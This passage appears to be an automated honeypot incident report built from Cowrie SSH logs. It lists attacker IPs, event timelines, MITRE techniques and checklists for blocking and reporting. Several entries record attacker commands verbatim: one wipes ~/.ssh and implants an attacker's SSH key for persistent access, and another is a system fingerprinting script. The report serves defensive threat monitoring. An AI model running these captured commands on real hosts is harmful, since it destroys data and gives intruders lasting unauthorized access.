| `2026-09-04 03:25:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:25:53` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd2c583d10c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:32 |
| **Last Seen** | 2026-09-04 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:32:21` | `cowrie.session.connect` |
| `2026-09-04 03:32:21` | `cowrie.client.version` |
| `2026-09-04 03:32:21` | `cowrie.client.kex` |
| `2026-09-04 03:32:22` | `cowrie.login.success` |
| `2026-09-04 03:32:22` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:32:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:32:22` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fda6ed695ed

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:36 |
| **Last Seen** | 2026-09-04 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:36:45` | `cowrie.session.connect` |
| `2026-09-04 03:36:45` | `cowrie.client.version` |
| `2026-09-04 03:36:45` | `cowrie.client.kex` |
| `2026-09-04 03:36:46` | `cowrie.login.success` |
| `2026-09-04 03:36:46` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:36:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:36:46` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0c7b83baea0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:41 |
| **Last Seen** | 2026-09-04 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:41:57` | `cowrie.session.connect` |
| `2026-09-04 03:41:57` | `cowrie.client.version` |
| `2026-09-04 03:41:57` | `cowrie.client.kex` |
| `2026-09-04 03:41:58` | `cowrie.login.success` |
| `2026-09-04 03:41:58` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:41:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:41:58` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfef8aee14b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:47 |
| **Last Seen** | 2026-09-04 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:47:29` | `cowrie.session.connect` |
| `2026-09-04 03:47:29` | `cowrie.client.version` |
| `2026-09-04 03:47:29` | `cowrie.client.kex` |
| `2026-09-04 03:47:30` | `cowrie.login.success` |
| `2026-09-04 03:47:30` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:47:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:47:30` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b996711cf3e0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:51 |
| **Last Seen** | 2026-09-04 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:51:32` | `cowrie.session.connect` |
| `2026-09-04 03:51:32` | `cowrie.client.version` |
| `2026-09-04 03:51:32` | `cowrie.client.kex` |
| `2026-09-04 03:51:33` | `cowrie.login.success` |
| `2026-09-04 03:51:33` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:51:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:51:33` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525f47ff1f60

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-04 03:52 |
| **Last Seen** | 2026-09-04 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:52:39` | `cowrie.session.connect` |
| `2026-09-04 03:52:39` | `cowrie.client.version` |
| `2026-09-04 03:52:39` | `cowrie.client.kex` |
| `2026-09-04 03:52:40` | `cowrie.login.success` |
| `2026-09-04 03:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667d532b2474

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-04 03:52 |
| **Last Seen** | 2026-09-04 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:52:43` | `cowrie.session.connect` |
| `2026-09-04 03:52:43` | `cowrie.client.version` |
| `2026-09-04 03:52:43` | `cowrie.client.kex` |
| `2026-09-04 03:52:43` | `cowrie.login.success` |
| `2026-09-04 03:52:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e41715e6c1c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-04 03:52 |
| **Last Seen** | 2026-09-04 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:52:46` | `cowrie.session.connect` |
| `2026-09-04 03:52:46` | `cowrie.client.version` |
| `2026-09-04 03:52:46` | `cowrie.client.kex` |
| `2026-09-04 03:52:47` | `cowrie.login.success` |
| `2026-09-04 03:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eac3eca194fb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-04 03:52 |
| **Last Seen** | 2026-09-04 03:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:52:47` | `cowrie.session.connect` |
| `2026-09-04 03:52:47` | `cowrie.client.version` |
| `2026-09-04 03:52:47` | `cowrie.client.kex` |
| `2026-09-04 03:52:48` | `cowrie.login.success` |
| `2026-09-04 03:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3451146e8178

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 03:58 |
| **Last Seen** | 2026-09-04 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 03:58:09` | `cowrie.session.connect` |
| `2026-09-04 03:58:09` | `cowrie.client.version` |
| `2026-09-04 03:58:09` | `cowrie.client.kex` |
| `2026-09-04 03:58:10` | `cowrie.login.success` |
| `2026-09-04 03:58:10` | `cowrie.direct-tcpip.request` |
| `2026-09-04 03:58:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 03:58:10` | `cowrie.direct-tcpip.data` |
| `2026-09-04 03:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241bfb7f5296

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:00 |
| **Last Seen** | 2026-09-04 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:00:48` | `cowrie.session.connect` |
| `2026-09-04 04:00:48` | `cowrie.client.version` |
| `2026-09-04 04:00:48` | `cowrie.client.kex` |
| `2026-09-04 04:00:49` | `cowrie.login.success` |
| `2026-09-04 04:00:49` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:00:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:00:49` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00492247c070

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]89` |
| **First Seen** | 2026-09-04 04:00 |
| **Last Seen** | 2026-09-04 04:06 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:00:59` | `cowrie.session.connect` |
| `2026-09-04 04:00:59` | `cowrie.client.version` |
| `2026-09-04 04:01:00` | `cowrie.client.kex` |
| `2026-09-04 04:01:01` | `cowrie.login.success` |
| `2026-09-04 04:01:02` | `cowrie.session.params` |
| `2026-09-04 04:01:02` | `cowrie.command.input` |
| `2026-09-04 04:01:02` | `cowrie.command.failed` |
| `2026-09-04 04:01:02` | `cowrie.log.closed` |
| `2026-09-04 04:01:03` | `cowrie.session.params` |
| `2026-09-04 04:01:03` | `cowrie.command.input` |
| `2026-09-04 04:01:04` | `cowrie.session.file_download` |
| `2026-09-04 04:01:04` | `cowrie.log.closed` |
| `2026-09-04 04:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]89` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a49b5440784

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]89` |
| **First Seen** | 2026-09-04 04:01 |
| **Last Seen** | 2026-09-04 04:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:01:04` | `cowrie.session.connect` |
| `2026-09-04 04:01:04` | `cowrie.client.version` |
| `2026-09-04 04:01:04` | `cowrie.client.kex` |
| `2026-09-04 04:01:05` | `cowrie.login.success` |
| `2026-09-04 04:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]89` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3ce18de84d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:04 |
| **Last Seen** | 2026-09-04 04:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:04:17` | `cowrie.session.connect` |
| `2026-09-04 04:04:17` | `cowrie.client.version` |
| `2026-09-04 04:04:17` | `cowrie.client.kex` |
| `2026-09-04 04:04:20` | `cowrie.login.success` |
| `2026-09-04 04:04:21` | `cowrie.session.params` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.success` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:21` | `cowrie.command.input` |
| `2026-09-04 04:04:22` | `cowrie.log.closed` |
| `2026-09-04 04:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f09d8430d522

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:06 |
| **Last Seen** | 2026-09-04 04:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:06:21` | `cowrie.session.connect` |
| `2026-09-04 04:06:21` | `cowrie.client.version` |
| `2026-09-04 04:06:21` | `cowrie.client.kex` |
| `2026-09-04 04:06:23` | `cowrie.login.success` |
| `2026-09-04 04:06:24` | `cowrie.session.params` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.success` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:24` | `cowrie.command.input` |
| `2026-09-04 04:06:25` | `cowrie.log.closed` |
| `2026-09-04 04:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa576982b1f

| Field | Detail |
|---|---|
| **Source IP** | `103.157.149[.]14` |
| **First Seen** | 2026-09-04 04:07 |
| **Last Seen** | 2026-09-04 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:07:05` | `cowrie.session.connect` |
| `2026-09-04 04:07:05` | `cowrie.client.version` |
| `2026-09-04 04:07:06` | `cowrie.client.kex` |
| `2026-09-04 04:07:07` | `cowrie.login.success` |
| `2026-09-04 04:07:08` | `cowrie.session.params` |
| `2026-09-04 04:07:08` | `cowrie.command.input` |
| `2026-09-04 04:07:08` | `cowrie.command.failed` |
| `2026-09-04 04:07:09` | `cowrie.log.closed` |
| `2026-09-04 04:07:10` | `cowrie.session.params` |
| `2026-09-04 04:07:10` | `cowrie.command.input` |
| `2026-09-04 04:07:10` | `cowrie.session.file_download` |
| `2026-09-04 04:07:10` | `cowrie.log.closed` |
| `2026-09-04 04:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.157.149[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.157.149[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faa75ce77f5b

| Field | Detail |
|---|---|
| **Source IP** | `103.157.149[.]14` |
| **First Seen** | 2026-09-04 04:07 |
| **Last Seen** | 2026-09-04 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:07:10` | `cowrie.session.connect` |
| `2026-09-04 04:07:10` | `cowrie.client.version` |
| `2026-09-04 04:07:10` | `cowrie.client.kex` |
| `2026-09-04 04:07:11` | `cowrie.login.success` |
| `2026-09-04 04:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.157.149[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.157.149[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddddcf00c998

| Field | Detail |
|---|---|
| **Source IP** | `103.157.149[.]14` |
| **First Seen** | 2026-09-04 04:07 |
| **Last Seen** | 2026-09-04 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:07:12` | `cowrie.session.connect` |
| `2026-09-04 04:07:12` | `cowrie.client.version` |
| `2026-09-04 04:07:12` | `cowrie.client.kex` |
| `2026-09-04 04:07:13` | `cowrie.login.success` |
| `2026-09-04 04:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.157.149[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.157.149[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96ad76b7422

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:08 |
| **Last Seen** | 2026-09-04 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:08:33` | `cowrie.session.connect` |
| `2026-09-04 04:08:33` | `cowrie.client.version` |
| `2026-09-04 04:08:33` | `cowrie.client.kex` |
| `2026-09-04 04:08:35` | `cowrie.login.success` |
| `2026-09-04 04:08:36` | `cowrie.session.params` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.success` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.command.input` |
| `2026-09-04 04:08:36` | `cowrie.log.closed` |
| `2026-09-04 04:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62b563d0c9b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:09 |
| **Last Seen** | 2026-09-04 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:09:03` | `cowrie.session.connect` |
| `2026-09-04 04:09:03` | `cowrie.client.version` |
| `2026-09-04 04:09:03` | `cowrie.client.kex` |
| `2026-09-04 04:09:04` | `cowrie.login.success` |
| `2026-09-04 04:09:04` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:09:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:09:04` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

